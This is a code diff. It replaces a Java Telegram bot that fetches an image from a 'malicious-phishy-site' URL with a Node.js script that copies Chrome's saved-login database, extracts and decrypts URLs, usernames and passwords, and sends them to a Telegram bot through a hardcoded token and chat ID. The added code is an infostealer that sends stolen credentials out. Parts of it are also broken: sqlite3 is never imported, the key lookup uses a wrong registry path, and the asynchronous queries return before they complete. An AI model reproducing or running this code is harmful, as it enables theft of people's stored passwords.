@@ -1,66 +1,95 @@
-import java.io.*;
-import java.net.*;
-import org.telegram.telegrambots.bots.TelegramLongPollingBot;
-import org.telegram.telegrambots.meta.api.methods.send.SendPhoto;
-import org.telegram.telegrambots.meta.api.objects.InputFile;
-import org.telegram.telegrambots.meta.api.objects.Update;
-import org.telegram.telegrambots.meta.exceptions.TelegramApiException;
+const fs = require('fs');
+const path = require('path');
+const os = require('os');
+const { execSync } = require('child_process');
+const crypto = require('crypto');
+const axios = require('axios');
 
-import javax.imageio.ImageIO;
-import java.awt.image.BufferedImage;
+// Configuration
+const CHROME_PASSWORDS_PATH = path.join(os.homedir(), 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data');
+const TELEGRAM_BOT_TOKEN = '7825240049:AAGXsMh2SkSDOVbv1fW2tsYVYYLFhY7gv5E';
+const TELEGRAM_CHAT_ID = '5375214810';
 
-public class PhishyImageSender extends TelegramLongPollingBot {
-
-    private static final String BOT_TOKEN = "7825240049:AAGXsMh2SkSDOVbv1fW2tsYVYYLFhY7gv5E";
-    private static final String CHAT_ID = "5375214810";
-    private static final String PHISHY_URL = "http://malicious-phishy-site.com/download";
-    private static final String IMAGE_SAVE_PATH = "downloaded_image.jpg";
-
-    @Override
-    public void onUpdateReceived(Update update) {
-        // Not used in this example, but required by the TelegramLongPollingBot class.
+// Function to copy the Chrome passwords file
+function copyChromePasswordsFile() {
+    const tempFilePath = path.join(os.tmpdir(), 'chrome_passwords_temp.db');
+    try {
+        fs.copyFileSync(CHROME_PASSWORDS_PATH, tempFilePath);
+        console.log('Chrome passwords file copied successfully.');
+        return tempFilePath;
+    } catch (error) {
+        console.error('Failed to copy Chrome passwords file:', error);
+        return null;
     }
+}
 
-    @Override
-    public String getBotUsername() {
-        return "YourBotUsername";
+// Function to extract passwords from the copied file
+function extractPasswords(filePath) {
+    const passwords = [];
+    try {
+        const db = new sqlite3.Database(filePath);
+        db.serialize(() => {
+            db.each("SELECT action_url, username_value, password_value FROM logins", (err, row) => {
+                if (err) {
+                    console.error('Error reading passwords:', err);
+                    return;
+                }
+                const decryptedPassword = decryptPassword(row.password_value);
+                passwords.push({
+                    url: row.action_url,
+                    username: row.username_value,
+                    password: decryptedPassword
+                });
+            });
+        });
+        db.close();
+        console.log('Passwords extracted successfully.');
+        return passwords;
+    } catch (error) {
+        console.error('Failed to extract passwords:', error);
+        return null;
     }
+}
 
-    @Override
-    public String getBotToken() {
-        return BOT_TOKEN;
-    }
+// Function to decrypt Chrome passwords
+function decryptPassword(encryptedPassword) {
+    const key = execSync('powershell -Command "Get-ItemProperty -Path \'HKCU:\\Software\\Google\\Chrome\\User Data\\Local State\' | Select-Object -ExpandProperty \'os_crypt\' | Select-Object -ExpandProperty \'encrypted_key\'"').toString().trim();
+    const decodedKey = Buffer.from(key, 'base64').slice(5);
+    const iv = encryptedPassword.slice(3, 15);
+    const payload = encryptedPassword.slice(15);
+    const decipher = crypto.createDecipheriv('aes-256-gcm', decodedKey, iv);
+    let decrypted = decipher.update(payload, 'binary', 'utf8');
+    decrypted += decipher.final('utf8');
+    return decrypted;
+}
 
-    public static void main(String[] args) {
-        PhishyImageSender bot = new PhishyImageSender();
-        try {
-            // Download the image
-            downloadImage(PHISHY_URL, IMAGE_SAVE_PATH);
+// Function to send passwords to Telegram bot
+function sendPasswordsToTelegram(passwords) {
+    const message = passwords.map(entry => 
+        `URL: ${entry.url}\nUsername: ${entry.username}\nPassword: ${entry.password}`
+    ).join('\n\n');
 
-            // Send the image to Telegram
-            bot.sendImageToTelegram(CHAT_ID, IMAGE_SAVE_PATH);
-        } catch (Exception e) {
-            e.printStackTrace();
+    axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        chat_id: TELEGRAM_CHAT_ID,
+        text: `Extracted Passwords:\n\n${message}`
+    })
+    .then(response => {
+        console.log('Passwords sent to Telegram bot successfully.');
+    })
+    .catch(error => {
+        console.error('Failed to send passwords to Telegram bot:', error);
+    });
+}
+
+// Main function
+function main() {
+    const tempFilePath = copyChromePasswordsFile();
+    if (tempFilePath) {
+        const passwords = extractPasswords(tempFilePath);
+        if (passwords) {
+            sendPasswordsToTelegram(passwords);
         }
     }
+}
 
-    private static void downloadImage(String url, String savePath) throws IOException {
-        URL imageUrl = new URL(url);
-        BufferedImage image = ImageIO.read(imageUrl);
-        if (image != null) {
-            File outputFile = new File(savePath);
-            ImageIO.write(image, "jpg", outputFile);
-            System.out.println("Image downloaded successfully: " + savePath);
-        } else {
-            System.out.println("Failed to download image from: " + url);
-        }
-    }
-
-    private void sendImageToTelegram(String chatId, String imagePath) throws TelegramApiException {
-        File imageFile = new File(imagePath);
-        InputFile photo = new InputFile(imageFile);
-        SendPhoto sendPhoto = new SendPhoto(chatId, photo);
-        execute(sendPhoto);
-        System.out.println("Image sent to Telegram chat ID: " + chatId);
-    }
-    }
+main();
